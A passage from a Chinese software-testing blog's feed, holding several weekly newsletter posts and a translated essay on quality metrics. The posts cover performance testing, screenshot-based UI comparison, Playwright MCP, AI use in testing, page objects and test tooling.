惯性和习惯：团队已习惯于 E2E 测试方法 管理或审计要求：外部条件要求特定测试方式 性能测试 做好性能测试最关键的点就在于如何获取有效的需求 https://medium.com/@sul0089/your-performance-tests-are-only-as-good-as-your-requirements-ebf3b0d88426\n这篇文章的观点跟我之前的想法是基本一致的。\n无论测试工具和框架多么先进，如果性能测试需求模糊、过时或与实际使用场景脱节，测试结果就无法反映现实情况，可能导致生产环境中出现性能问题。\n下面这些技巧可以帮忙大家梳理清楚性能需求\n利用过去 3 年的生产数据 + 增长预测 分析历史使用模式：并发用户数、每秒/分钟事务数、数据吞吐量、API 调用量、峰值使用时的内存/CPU 消耗\n将这些指标与业务增长预期对齐（例如：如果黑色星期五流量每年增长 15%，2025 年的测试必须模拟比 2022 年增加 50-55%）\n理解峰值负载的特性 区分短暂峰值（如抢购、重大公告）和持续负载（如报税季、课程注册期）\n确认一天或一周内是否有多个峰值窗口\n不同类型的峰值需要不同类型的性能测试\n使用适当的测试类型模拟生产使用情况 负载测试：验证系统能否处理预期的日常/每周使用水平 压力测试：识别上限及系统在压力下的行为 稳定性测试：检查长期性能下降或资源泄漏 突发测试：模拟流量的突然、意外激增 在许多情况下需要混合测试方法 自动化测试 使用截图比较的方法来进行移动端的自动化测试 https://www.thegreenreport.blog/articles/mobile-qa-automation-leveraging-visual-screenshot-comparison-for-ui-consistency/mobile-qa-automation-leveraging-visual-screenshot-comparison-for-ui-consistency.html\n这个思路其实是非常直接的，就是截取一张基线图片，然后在测试中截图与基线图片进行对比。\n两张图差异比较大的话就可以猜测是不是功能出现了异常。\n核心代码也不难。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 def compare_images(baseline_path, current_path, diff_path): if not os.path.exists(baseline_path): print(f\u0026#34;No baseline found at {baseline_path}. Creating new baseline.\u0026#34;) return False baseline_img = Image.open(baseline_path).convert(\u0026#39;RGB\u0026#39;) current_img = Image.open(current_path).convert(\u0026#39;RGB\u0026#39;) if baseline_img.size != current_img.size: print(\u0026#34;Images have different dimensions. Resizing for comparison.\u0026#34;) current_img = current_img.resize(baseline_img.size) diff = ImageChops.difference(baseline_img, current_img) if diff.getbbox() is None: return True diff = diff.convert(\u0026#39;RGB\u0026#39;) for x in range(diff.width): for y in range(diff.height): r, g, b = diff.getpixel((x, y)) if r != 0 or g != 0 or b != 0: diff.putpixel((x, y), (255, 0, 0)) diff.save(diff_path) return False 这个判断方式有点粗糙，只能说可以用，但不一定好用。\n后面结合大模型的多模态能力进行更加智能的比对可能效果会更好一点。\n探索性测试的历史演变 1970 年代-1980 年代 探索性测试的根源可以追溯到早期软件开发中常见的临时测试实践。虽然当时还没有正式认可，但许多测试人员自然而然地会在编写的测试用例之外探索软件。\n1990 年代 \u0026ldquo;探索性测试\u0026quot;一词由 Cem Kaner 在 1983 年首次提出，但在 1990 年代才真正获得广泛关注。 Bach 和 Bolton 进一步发展了这一概念，引入了基于会话的测试管理（SBTM），为探索性测试提供了结构化框架。\n2000 年代至今 敏捷方法论的兴起促使探索性测试的应用日益增多。\n对快速反馈和适应性的需求与敏捷原则完美契合，使探索性测试成为现代测试策略中不可或缺的组成部分。\n","date":"2025-05-09T09:36:02+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%91%A8%E5%88%8A003-%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%97%B6%E4%BB%A3%E6%B5%8B%E8%AF%95%E5%B0%86%E4%BC%9A%E5%8F%98%E5%BE%97%E6%9B%B4%E5%8A%A0%E9%87%8D%E8%A6%81/","title":"测试周刊003: 大模型时代测试将会变得更加重要"},{"content":"离五一只有两周了。\n最近有朋友买了 cursor 的会员，我驻足观看了一番。\n他先描述需求，然后让大模型生成原型，接着又让 LLM 根据原型来生成前后端项目的代码。\n整体流程一气呵成，看着非常有科幻感。\n不难想象，接下来根据可以工作的前后端代码就可以让大模型来生成 ui 和接口的自动化测试用例。\n不久的将来，通过 AI 生成的各种测试代码可能会是开发标准输出的一部分了吧。\nAI 与测试的思考 停止过度设计：为什么测试 ID 比人工智能驱动的定位器智能更适合 UI 自动化(英文) https://testersdigest.blogspot.com/2025/04/stop-overengineering-why-test-ids-beat.html\n并不是所有的测试人员都关注 AI。\n并不是所有关注 AI 的测试工程师都盲目的拥抱 AI。\n这篇文章就反对使用人工智能来解决 UI 自动化测试中的定位问题，而是提倡使用测试 ID（Test IDs）这一更简单有效的方法。\n测试 ID 稳定可靠：测试 ID（如data-testid=\u0026quot;submit-button\u0026quot;）是可预测的，不会因为开发人员更改 CSS 类、更新布局或重命名元素而失效。\n避免不必要的 AI 复杂性：为什么要让 AI 去\u0026quot;猜测\u0026quot;正确的元素，当我们可以从一开始就通过测试 ID 明确告诉 DOM 要查找什么。AI 应该增强测试策略，而不是清理本可避免的混乱。\n效率优于优雅：在测试中，我们的目标是验证功能而非创造艺术。Test ID 是低耦合、高效率的工具，能直接指向我们关心的元素，且运行更快。\n过度工程化难以扩展：使用 AI 来修复不稳定的测试和适应 UI 变化增加了另一层复杂性，意味着更多不可控的点。如果 AI 模型抽风了，不仅测试会失败，还需要进行 AI 调试。\n开发者应参与其中：添加data-testid属性是一项投入小、回报大的工作，是构建可测试软件的一部分。\n与其追求 AI 驱动的自我修复测试自动化梦想，不如使用 Test ID 构建一个从一开始就可靠的系统。\n💡AI 很棒，但不应该用来解决本不应该存在的问题。\nAI 工具 n8n https://n8n.io/\n一款原生支持 AI 的自动化工具，感觉跟 RPA 很像，但这款是开源的，可以自己搭私服玩。\n很适合做办公自动化的工作。\n另一款 playwright 的 mcp 实现 https://github.com/executeautomation/mcp-playwright\n跟官方出品的那款功能差不多。可以支持 Claude Desktop, Cline 以及 Cursor IDE\nAI 课程 微软出品的 ai agent 教程 https://github.com/microsoft/ai-agents-for-beginners\n10 节课教你开启构建 AI Agent 所需的一切知识\n测试工具 Bruno-另一款 postman 的替代工具 https://github.com/usebruno/bruno\n很奇怪，每次看到可以替换 postman 的工具我都非常兴奋。\n可能是被 postman 弄应激了。\nBruno 有下面一些不错的特性\n支持 win/mac/linux 支持 gui cli 以及 vscode 扩展 脚本保存为纯文本的格式，对 git 比较友好 支持 js 脚本扩展 之前这款工具的口碑还是不错的，毕竟开源免费。\n后来推出了收费订阅功能，pro 版本每人每月 6 美金，Ultimate 版本 11 美金每人每月。\n比 postman 还是要便宜的。\n免费的版本够用了，而且不用强制注册登录，还是推荐吧。\n后来看了一眼 bruno 团队的情况，好吧，是一个印度团队。\n另外，热知识。\npostman 也是印度团队开发的。\npostman 在被收购之前，还是很好用的。\n所以，bruno 在被收购之前，免费版本应该是可以快乐使用的吧。\n观点 不仅仅是“手动测试”：重新认识软件测试人员的技能(英文) https://www.ministryoftesting.com/articles/more-than-just-manual-testing-recognising-the-skills-of-software-testers\n在这篇文章里，作者提出了一些很有意思的观点。\n“手工测试”一词具有误导性且贬低测试职业\n使用“手工测试”容易让人误以为这类测试只是机械执行脚本、技术含量低，从而贬低了测试人员在探索、分析和判断上的深度能力。这种语言强化了“非自动化=低价值”的误解。\n测试不该被简化为“手动 vs 自动”的二元对立\n测试是一项复杂的认知活动，包含探索、批判性思维和创造力，不应以是否使用自动化工具来定义。自动化是测试工具之一，而非测试的全部。\n“手工测试工程师”标签带来职业限制与偏见\n该标签会让测试人员在职业发展中被边缘化，比如被认为不具备技术能力、难以晋升、或不符合现代招聘的“全能型”需求，阻碍了多样化技能的发展。\n语言塑造认知，应更新测试话语体系\n我们应该用更精准的词汇来描述测试类型，例如“探索性测试”“分析性验证”“人机协同测试”等，或干脆就称“testing”，以消除人为制造的技术鄙视链。\n推动更协同与尊重的测试文化\n测试应被看作人机协作的整体过程，人类的判断力与自动化工具互补，而非彼此竞争。换一种语言，也是在推动更包容、更精准的测试职业文化。\n✅ 作者呼吁：\n停止在职位描述和日常交流中使用“手工测试”这一称谓。 教育团队认识到非自动化测试同样关键。 重视能力多样性，而不是把“是否会写自动化脚本”作为衡量标准。 总之：测试是认知性的工作，不是执行性的流程，我们需要用更精准、更有尊重的语言去描述它。\n质量常数：思考与行动要具有实验性(英文) https://testerstories.com/2025/04/the-quality-constant-think-and-act-experimentally/\n作者将“光速是时空的中介”类比为测试工作中的核心理念，强调测试的本质是通过实验不断获得洞察与调整方向。 他建议测试人员培养“实验性思维”，通过不断设计小实验、观察反馈、快速纠错来降低错误成本并提升产品质量。 测试不仅是发现错误，更是通过构建证据、分析因果、讲述质量故事，为整个软件开发过程注入信心与洞察力。 自动化测试 如何测试 grpc 服务(英文) https://medium.com/@alexshamrai/grpc-testing-intro-writing-the-first-test-ac816fbae19d\n面向新手的 grpc 测试教程，例子比较简单，但过程很完整。\n包含了正常场景和异常场景的测试用例。\n自动化测试中使用 Docker 多阶段构建(multi-stage builds)来优化测试环境(英文) https://www.thegreenreport.blog/articles/docker-multi-stage-builds-the-secret-weapon-for-efficient-qa-automation/docker-multi-stage-builds-the-secret-weapon-for-efficient-qa-automation.html\n传统 Docker 测试容器存在一些问题\n包含不必要的构建工具、依赖、源代码和中间构建产物，导致镜像体积大 构建慢 网络传输时间长 启动慢且消耗更多资源 多阶段构建通过在 Dockerfile 中使用多个 FROM 语句，允许从一个阶段选择性地复制构件到另一个阶段，丢弃不需要的部分。\n作者提供了一个 Python 网页应用测试环境的实例，分为三个阶段：\n构建依赖阶段：使用完整 Python 镜像预构建 Python 依赖包 Chrome 和 driver 准备阶段：基于精简 Debian 镜像安装 Chrome 和 ChromeDriver 最终精简测试镜像：使用 slim Python 镜像，只复制前两个阶段中必要的文件和依赖 这种方法的好处包括：\n镜像体积减少约 70%，加快存储、网络传输和启动时间 提高安全性，减少潜在漏洞 提供更接近生产环境的测试环境 利用 Docker 缓存机制加速构建过程 如何使用 Playwright 插件来简化 API 测试中的 JSON Schema 校验工作(英文) https://dev.to/sebastianclavijo/new-playwright-ajv-schema-validator-for-api-testing-191e\n插件亮点：\n基于广泛使用的 Ajv（Another JSON Schema Validator）构建。\n支持 JSON Schema、OpenAPI 3、Swagger 2 等格式的验证。\n通过提供 endpoint、method 和 status，插件会自动从 OpenAPI/Swagger 文档中提取对应 schema 并进行验证。\n与 Playwright 的标准 API 请求兼容，也可与 pwApi 和 pwAxios 无缝集成。\n提供详细的验证结果展示，包括错误数量、具体错误信息、定位错误字段等。\n断言的例子。只需要定义schemaDoc就可以自动断言了。\n1 2 3 4 5 6 7 8 9 10 11 // Get your schema doc from a URL or a file const schemaDoc = ... // Make API call and get the \u0026#39;response\u0026#39; const data = response.body const validationResult = await validateSchema( { page }, data, schemaDoc, { endpoint: \u0026#39;/api/resource\u0026#39;, method: \u0026#39;POST\u0026#39;, status: 201} ); 感受 很多年前机器比人工贵，所以招人做测试比较划算。\n现在人工比机器贵，所以要求用自动化的方式让机器去做测试。\n未来人工比 AI 贵，AI 所以大部分的测试工作都可以让 AI 去完成了吧？\n未来的行业，只要从业人员的薪资大于 AI 需要的电费，那么基本上都会被替代了吧？\n","date":"2025-04-17T16:05:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%91%A8%E5%88%8A-ai%E4%B8%8D%E5%BA%94%E8%AF%A5%E7%94%A8%E6%9D%A5%E8%A7%A3%E5%86%B3%E6%9C%AC%E6%9D%A5%E5%B0%B1%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98/","title":"测试周刊-AI不应该用来解决本来就不存在的问题"},{"content":"清明过后似乎会更加期待劳动节一些。\n今年五一放五天假，时间是充裕的，但想到各大景点的人山人海，可能最终还是会选择躲在家里吧。\n看看书，在附近活动活动，陪陪家人，安静的时光就足够了吧。\nAI 工具 最近在读一本关于二战时期太平洋战争的书，里面一些细节很有意思。\n比如美军在珍珠港被空袭之后大概一年的时间里，一直在边打仗边学习。\n因为美军中大部分将军和士兵都没有经历过真正的战争。\n因此战争初期配合失误和自身混乱的情况时有发生。\n感觉跟最近的 AI 热潮很像，大部分人都没有既往的经验，只能边用边学。\n在实战中创新。\n这两周跟 AI 相关的测试动态里，最让人眼前一亮的就是 playwright 发布了官方的 MCP 支持。\ngithub 地址在这里:https://github.com/microsoft/playwright-mcp。\n目前 7k+的 star，热度还是很高的。\n看一下官方介绍。\n基于 Playwright 实现浏览器自动化的 MCP。该服务器使大语言模型(LLM)能够通过结构化的可访问性快照与网页交互，无需依赖截图或视觉模型。\n核心优势\n​- 快速轻量 ​​：采用 Playwright 的无障碍访问树技术，非像素级输入 ​- 适配 LLM​​：无需视觉模型，完全基于结构化数据操作\n确定性操作 ​​：避免基于截图方法常见的歧义问题 应用场景\n网页导航与表单填写(自动化操作) 结构化内容数据提取(爬虫) LLM 驱动的自动化测试(自动化测试) 智能体的通用浏览器交互接口(通用操作) 既然做 UI 自动化又难又花时间，那么不如让大语言模型帮助我们去实现吧。\n目前已经看到有人使用 Playwright + Cursor + MCP Server 跑通了自动化测试的流程。\n具体效果在这里：https://www.youtube.com/watch?v=cNh3_r6UjKk\nAI 测试策略 https://testingtitbits.com/ai-usage-for-testers-quadrants-model/ 这篇文章里作者讨论了 AI 的测试策略。\n作者把测试工作分成了 4 个象限。\n1. 自动化专区（高概率-低影响） ​​AI 的主战场 ​​：处理重复性、低风险的基础工作，释放测试人员精力\n🔹 邮件撰写 🔹 根据流程图草拟测试用例 🔹 生成样板代码 🔹 流程文档记录 💡 ​​ 使用策略 ​​：让 AI 完成基础框架，人工优化提升效率 ⚠️ ​​ 注意事项 ​​：AI 生成内容可能缺乏语境，需人工校准润色\n2. 格式辅助区（低概率-低影响） ​​AI 的辅助领域 ​​：结构化数据处理，提升工作效率而非创造价值\n🔹 报告格式标准化 🔹 文档结构调整 🔹 文件格式转换 🔹 数据归类整理 💡 ​​ 使用策略 ​​：利用 AI 批量处理格式化工作 ⚠️ ​​ 注意事项 ​​：注意数据转换可能存在的格式错位\n3. 精准操作区（高概率-高影响） ​​ 人机协作区 ​​：直接影响软件质量的关键环节\n🔹 根据逻辑生成测试脚本 🔹 构建复杂正则表达式 🔹 生成结构化测试数据 🔹 代码重构优化 💡 ​​ 使用策略 ​​：AI 提供方案建议，人工严格验证 ⚠️ ​​ 注意事项 ​​：警惕 AI 生成的测试逻辑漏洞，数据缺乏实际业务特征\n4. 创新思维区（低概率-高影响） ​​ 人类专属领域 ​​：需要战略思维和创造力的核心工作\n🔹 制定测试策略 🔹 解决独特测试难题 🔹 设计测试架构 🔹 开展回顾分析 💡 ​​ 使用策略 ​​：将 AI 作为数据分析助手，决策权保留给人类 ⚠️ ​​ 注意事项 ​​：AI 无法预测边界情况，缺乏业务直觉\n总结起来就是脏活累活给 AI 干，其他创新性和精细化的事情交给人类专家。\n所以以后就是探索性测试(老司机测试)的天下了？\n测试框架 页面对象模型的渐进式构建与优化：分步迭代方法论(英文) https://www.ontestautomation.com/building-and-improving-page-objects-one-step-at-a-time\n这篇文章里作者讨论了如何逐步的进行页面对象的重构工作。\n最终的效果是这样的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export class ExtendedReportPage extends ReportBasePage { readonly page: Page; readonly radioSelect: Locator; readonly reportFormFieldAdditionalInfo: ReportFormField; constructor(page: Page) { super(page); this.page = page; this.radioSelect = page.getByLabel(\u0026#39;Extended report\u0026#39;); this.reportFormFieldAdditionalInfo = new ReportFormField(this.page, \u0026#39;additionalInfo\u0026#39;); } async create(title: string, summary: string, additionalInfo: string, roles: string[]) { await this.reportFormFieldTitle.complete(title, roles); await this.reportFormFieldSummary.complete(summary, roles); await this.reportFormFieldAdditionalInfo.complete(additionalInfo, roles); await this.buttonSaveReport.click(); } } ​ 并行测试执行的扩展策略 ​(英文) https://medium.com/@evgeniy.otsevich/scaling-strategies-for-parallel-test-execution-6f15cf2d5e6d\n这篇文章讨论了水平扩展,垂直扩展和混合扩展的策略，另外还介绍了常用的测试框架：selenium/playwright/cypress 的并行执行策略。\n测试工具 OS 视觉回归测试：快照测试（Snapshot Testing）实现指南 (英文) https://javios.eu/test/snapshot-test-on-ios/\n这篇文章讨论了如何使用截图对比的方式进行 ios 应用的回归测试。\n言论 关于测试与监控的关系: 将昂贵的测试替换为监控可以让组织加快开发速度，但每个组织都需要在速度与确保（或尽可能确保）发布到生产环境前系统正常运行之间找到平衡点。这种平衡很大程度上取决于所涉及的系统特性。例如，Facebook 的开发团队能够放弃某些测试，因为他们建立了良好的反馈机制，能及时获知生产环境中的故障，并能快速发布修复程序。即使出现问题（比如用户无法查看照片或错过朋友生日提醒），后果也并不严重。另一个极端是医疗设备编程公司，这类系统容错率极低且反馈周期漫长，因此必须在使用前尽最大努力确保设备运行无误。大多数系统则介于这两个极端之间。 by Rouan Wilsenach\n","date":"2025-04-11T09:16:18+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%91%A8%E5%88%8A-%E6%86%A7%E6%86%AC%E4%BA%94%E4%B8%80%E7%9A%84%E7%AC%AC%E4%B8%80%E5%91%A8/","title":"测试周刊-憧憬五一的第一周"},{"content":"前言 看到一篇讨论质量指标的文章。\n文中描述了 3 个过时的不推荐继续使用的指标。\n平心而论，作者认为这 3 个指标没什么用，这点我是完全赞同的。\n本质就是这 3 个指标里有 2 个是过程指标，而不是结果指标。\n过程指标只能说明你做了什么，而不能说明你做的好不好。\n质量的结果指标是非常难去度量的，很多对结果指标的罗列只不是过隔靴搔痒而已。\n所以作者的思路从度量结果指标转变成了度量最终用户的满意度。\n这点非常正确，但在极度内卷的今天，没有完备的过程指标实际上会让团队及质量团队的管理者寸步难行。\n所以求同存异吧。\n正文 这些年，我见证过各种\u0026quot;专家\u0026quot;试图\u0026quot;测量\u0026quot;或\u0026quot;实现\u0026quot;质量。我必须承认，我感到不堪重负并想尖叫。如果这篇文章冒犯到你，我提前道歉。\n质量无法被客观或全面地衡量，但可以通过代理指标和反馈评估的结合来进行判断。我坚信客户满意度——无论使用何种具体指标——才是真正反映质量感知水平的唯一参数。实现 100%的代码覆盖率或解决所有已知缺陷，并不能保证在 Play Store 或 Apple Store 等平台获得正面评价。归根结底，质量就是满足客户期望，而这些期望由于其主观性本质，本身就难以量化。\n质量无法被实现。（如果无法衡量，你如何知道自己是否实现了它？哈哈）。质量是副产品。质量只能被间接追求。将质量设为主要目标现实吗？当你直接追求\u0026quot;质量\u0026quot;时，你可能会忽视那些真正促成质量的关键因素，比如需求、标准化、反馈循环、员工参与度等。相反，通过关注基础要素，质量自然会作为副产品出现。可以这样理解：你不会直接追求孩子的\u0026quot;健康\u0026quot;，而是确保他们获得适当营养、定期锻炼、充足睡眠、情感支持、在安全有爱的环境中成长等等。同理，在组织内部，有无数直接或间接影响整体质量水平的活动。\n首先，我想分享个人的挑战经历，希望我的见解能给你新的视角。以下是我认为被高估的三大指标[又名无用指标]：\n1. 编写/执行的测试用例数量 测试用例提升质量的方式，就像膳食补充剂增进健康一样——其实并不能，甚至可能通过拖慢进度造成伤害。我不反对检查清单，但坚决反对将测试用例作为独立产物创建或使用测试用例管理系统。作为质量经理这么说可能很奇怪，请容我解释。\n大量测试用例会带来虚假的信心。专业的探索性测试至关重要，但在集成环境中执行预先编写的手动测试用例只是检查。W. Edwards Deming 说得好：\u0026ldquo;检查不能改进质量，也不能保证质量。检查为时已晚。质量，无论是好是坏，已经存在于产品中。\u0026rdquo;\n让我用一个故事说明关键观点。休产假期间，我所在公司因核心团队超负荷而雇佣外包团队完成某些目标。由于没有足够时间传授质量管理方法，他们沿用原有流程。其中一项任务是为产品添加自定义标签。虽然这个功能相对较小，但对系统影响重大——这些标签出现在使用不同技术栈编写的数十个服务中。\n当我回归时，发现团队正在准备大版本发布前的完整回归测试。自动化 UI 测试资源有限，我们通常的全系统回归测试周期（含修复时间）需要 1 天。但当询问时间安排时，测试工程师骄傲地展示了数百个手动测试用例（大部分重复步骤）和精美的历史执行图表。他们的回归测试预估？仅一个功能就需要 2.5 天！\n关键在于：在他们的世界里，测试这样一个功能需要 2.5 天，整个应用程序的手动测试可能需要半年/次。\n我决定研究该功能。花费 30 分钟调查功能与系统的集成后，发现了五个不同严重程度的缺陷。随后要求准备关键步骤检查清单和影响分析图，并同意在发布期间分配 1 小时进行回归测试。然后礼貌地请他们废弃我不在期间创建的所有内容——包括那些精美但无用的图表。\n在不评判公司困难时期决策的前提下，这种情况凸显了测试用例的低效。\n我们早已不再用代码行数衡量开发者绩效，但仍有公司通过测试编写/执行数量评估测试团队表现。请停止！\n2. 单元测试覆盖率百分比 我在另一篇文章《可调节测试漏斗》中详细讨论过这个话题。这里简要总结：这可能不是主流观点，但我认为单元测试被高估了。当工程师批判性思考代码时单元测试很有价值，但这些测试不能保证功能按预期工作。实际上，投资集成和系统测试可能比专注单元测试更具经济效益。毕竟企业关心系统行为，而非实现细节。\n先说指标。常见问题是管理者设置质量门禁（比如低于 80%单元测试覆盖率禁止合并 PR）。结果数量优先于实际质量，团队最终创建无意义的单元测试来勾选复选框。管理者骄傲报告\u0026quot;单元测试覆盖率提升至 95%\u0026quot;，却忽视这些测试的实际价值存疑（部署时间也增加了，但嘘\u0026hellip;）。\n此外，我曾\u0026quot;有幸\u0026quot;与认为测试是\u0026quot;单元测试\u0026quot;或\u0026quot;别人的问题\u0026quot;的开发者共事。这种心态导致许多问题，特别是环境差异导致的问题。你肯定听过经典借口：\u0026ldquo;在我本地环境能运行！\u0026quot;（我敢说单元测试覆盖了）。\n当然现实中你可能遇到需要强制设置此类门禁的情况（真心希望你不会）。最终，质量关乎评估项目风险，理解团队能带来的纪律和专注程度。这正是 Jurgen Appelo 在《管理 3.0》中提到的\u0026quot;敏捷盲点\u0026rdquo;：\n\u0026ldquo;以人为本\u0026quot;的理念很棒，直到你发现团队由两个巨魔、一只鹦鹉、一个理发师，和相对聪明但聋哑盲的项目经理组合。\n3. 发现/解决的缺陷数量 首先，\u0026ldquo;不解决所有已知缺陷就不发布\u0026quot;的策略通常会导致员工偷偷摸摸和发布日期延迟，除非你身处医疗或航空等高危行业。\n其次，仅看缺陷数量会产生虚假安全感。例如在小功能中修复 10 个缺陷，并不自动意味着高质量。有个测试原则叫\u0026quot;无错误谬误\u0026rdquo;——提醒我们无论修复多少缺陷，功能仍可能存在关键安全问题或无法满足用户需求。\n此外，将缺陷作为工单提出成本很高，因为这迫使团队重复整个开发流程。有时修复后软件可能比之前有更多缺陷。错误难免发生，我们只是凡人。应该专注于预防：编写清晰的高质量需求、尽早向 QA 团队或产品负责人演示功能（在 PR 前）、建立良好代码评审规范、投资多层级回归测试自动化。\n不过长期跟踪缺陷率可能有帮助。但上下文决定一切。你在同类比较吗？缺陷率飙升可能是因为新开发者加入，或团队高压加班。数字只讲部分故事。要真正改进，需同时考虑定量和定性指标，并着眼全局。\n最后，有些公司为已知缺陷创建独立看板，但说实话：专用缺陷看板往往成为问题的坟墓。将缺陷纳入待办事项更有效。最好实现自动化提醒：如果缺陷三个月未解决，系统自动关闭卡片。\n应该怎么做？关注驱动质量的要素 平衡速度和质量常带来挑战，导致公司做出权衡——有时为赶工期牺牲质量。因此组织必须建立与优先级一致的清晰可衡量目标，比如\u0026quot;在保持或提升 NPS 和 eNPS 的前提下缩短交付周期\u0026rdquo;。这样做能在异常时获得预警。例如即使 NPS 因期待已久的功能交付而提升，eNPS 下降可能暗示深层问题。当代码质量存疑时，员工很难满意交付。更多信息可参考我的文章《从成本中心到业务推动者：将质量嵌入公司 DNA》。\n在关注任何指标前，组织应确定需要几个 9。没有 100%可靠的事物。这就是 1970 年代 AT\u0026amp;T 提出\u0026quot;五个九\u0026quot;可靠性概念的原因，确保电话系统几乎始终可用。该理念迅速成为关键系统的黄金标准，专注于最小化停机时间（通常量化为 99.999%可用性）。这常用于航空航天和医疗设备等高可靠性行业。\n99%可用性：年停机 3.65 天 99.999%可用性：年停机 5.26 分钟 考虑以下因素确定系统可容忍的不可用时间：\n了解导致客户不满的可靠性水平 分析停机对业务的影响（财务损失、声誉损害等） 权衡高可靠性的成本与收益 考虑公司当前阶段（初创公司可能优先灵活性和速度，成熟公司可能投资可靠性） 行业监管标准 竞争对手的可靠性水平 实现极致可靠性需要基础设施、流程、测试和维护的重大投资。平衡质量与创新和快速上市需求更重要。随着系统发展和客户群扩大，公司可增加可靠性投资。\n确立可靠性目标后，即可开始指标讨论。指标的终极目标是通过测量开启对机会的理解。指标宜精不宜多。过多数据会导致分析瘫痪，使聚焦困难并浪费资源。应结合定性反馈和定量数据来纵览全局。定量指标提供数字洞察，但无法解释\u0026quot;为什么\u0026quot;；只有定性指标能提供确定下一步的必需洞察。调查是评估难以量化方面和识别痛点的宝贵工具。定性指标必须与定量指标对应；若存在差异，通常是定量指标出问题。员工可能在操纵指标。Karen Phelan 在《抱歉我搞垮了你的公司\u0026hellip;》中强调：指标是手段而非目的。\n\u0026ldquo;人们为指标而管理！有时甚至操纵指标！指标看板就像汽车仪表盘。如果只盯着它不看路，就会撞车！\u0026rdquo;\n在讨论具体指标前，我坚决反对收集关注个人绩效的指标。这些指标常具有误导性和片面性，会分裂团队，迫使他们关注个人目标而非团队最优解，甚至玩弄系统。当然有时需要数据来决定奖惩，但有更好的解决方法。归根结底，你可以参考 Simon Sinek [卓越的绩效 vs 信任曲线]，直接问团队：\u0026ldquo;谁是混蛋？\u0026rdquo;\n相较于个人指标，我专注于收集能洞察团队动态、突出工作流瓶颈且不破坏信任的数据（重申：质量是副产品）。通常将指标分为四类：\n如何确保客户满意度？ 如何加速产品交付？ 系统可靠性是否符合客户预期？ 工作方式有哪些改进空间？ 如何确保客户满意度？ 客户反馈是质量问题的预警系统，帮助识别风险与机会，产生可操作的改进见解，推动必要纠正措施。可通过分析客户投诉、支持请求和报告问题有效开展评估。常用指标包括 NPS、CSAT、CES、留存率、流失率等。\n此类评估的终极目标是验证产品假设并回答关键问题：\u0026ldquo;我们做的是正确的事吗？\u0026ldquo;这是证据驱动管理的核心。\n如何加速产品交付？ 交付速度直接影响质量。更短的交付周期通过减少反馈循环加速问题识别与解决。缺乏严格流程或某些流程未自动化会导致错失机会。例如因优先级混乱，数月前产生的缺陷可能突然变成紧急问题。宝贵想法和改进可能卡在待办列表等待审核。\n要加速交付，可以从测量工作流每个环节开始。许多工具能自动化此过程，但通过观察手动收集近似数据也是良好起点。像\u0026quot;评估时间\u0026rdquo;（从创意产生到评估的时间）能突出决策延迟。\u0026ldquo;设计交付周期\u0026rdquo;（完成设计阶段的时间）有助于识别原型设计、线框图或用研中的瓶颈。\u0026ldquo;待办事项年龄\u0026rdquo;（创意加入待办列表的时间）是检测流程停滞的另一个有价值指标。\n有几个流行的工程指标能提供交付速度的关键洞察。例如周期时间和交付时间跟踪任务从开始到完成的时长（取决于团队对\u0026rsquo;开始\u0026rsquo;和\u0026rsquo;完成\u0026rsquo;的当前定义）。团队可约定跟踪\u0026quot;少于 N 行代码的 PR 百分比\u0026quot;以确保变更尽量小。监控提交频率、部署频率、构建时间和 PR 响应时间等指标有助于突出每服务的流程效率。此外，跟踪未计划工作或返工的比例能发现拖慢流程的环节。\n注意分析交付时间指标时，不要过度依赖平均值。虽然平均值提供高层视图，但可能导致误解。要获得更清晰的画面，请使用百分位数指标（如 P50、P90、P95、P99）。\n系统可靠性是否符合客户预期？ 可靠系统还能建立信任。当用户知道可以依赖你的产品时，他们更可能坚持使用，即使替代方案更便宜。预防问题比处理重大故障的后果更容易（也更便宜）。通过整合持续监控、主动事件管理和强大安全措施，组织创建的不仅是高性能系统，更是弹性和安全的系统。\n持续监控：自动化监控工具对实时跟踪应用延迟、正常运行时间、正常/峰值负载下的 CPU 使用率、长时间数据库查询等性能指标至关重要。确保设置性能阈值警报。同时监控服务依赖项以确保第三方服务/API 的稳定性。可能需要定义 SLA 并测量达标率。\n事件管理：快速解决事件很重要，但应与客户预期和团队能力匹配。否则团队可能从价值驱动工作转向事件驱动工作。几个关键指标能全面反映事件生命周期：\n首次响应时间（FTTR）：确认事件发生所需时间 平均修复时间（MTTR）：反映团队解决不同严重性事件的速度 事后审查完成率（PIR）：完成事后分析的百分比 按服务跟踪事件和问题也很有帮助。如果你熟悉软件测试中的缺陷聚集原则，就知道这能揭示应用中需要特别关注的不稳定区域。\n安全审计：定期安全审计对评估系统和基础设施弹性至关重要。可使用内部资源或第三方公司。ISO 27001、GDPR、SOC 2、PCI DSS 等标准提供全面指南，但无需从大处着手。小步骤也能见效——比如约定当 Sonar 等静态分析工具检测到漏洞时不合并代码。但这些行动只有在组织具有强大的安全问题管理政策并持续测量政策遵循情况时才有效。\n工作方式有哪些改进空间？ 这个问题将焦点转向团队协作方式。在\u0026quot;亚里士多德计划\u0026quot;中，Google 分析 180 个团队来回答\u0026quot;什么造就高效团队？\u0026ldquo;研究发现最关键因素是心理安全，其次是可靠性（\u0026ldquo;成员可靠完成任务并达到高标准\u0026rdquo;）。\n除非你的创意和代码完全由 AI 生成，否则数字无法提供全貌。你愿意以员工幸福感为代价加速交付吗？不考虑员工在使用工具、技术、流程和公司文化时的整体体验，质量改进就不可能实现。\n全面的员工参与度调查能揭示如何改进流程以及哪些改变能推动实质性改进。这是提升员工满意度和运营效率的强大工具。\n例如跟踪深度工作时间（如确保员工至少有一天无会议）反映其专注力和生产力。eNPS（员工净推荐值）捕捉整体满意度和忠诚度，团队健康调查评估士气和福祉。规划准确性和自助文档可用性等指标表明员工获得的支持程度。交付顺畅度评估任务完成的无摩擦程度。参与度还与组织价值观一致性（通过调查评估）和有效一对一会议质量（员工感到被倾听）相关。最后，根据个人职业抱负制定发展计划能促进成长和动力。\n无论实施何种改进，请记住约束理论：\n\u0026ldquo;在瓶颈之外所做的任何改进都是幻觉。\u0026rdquo; ——Gene Kim，《凤凰项目：一个关于 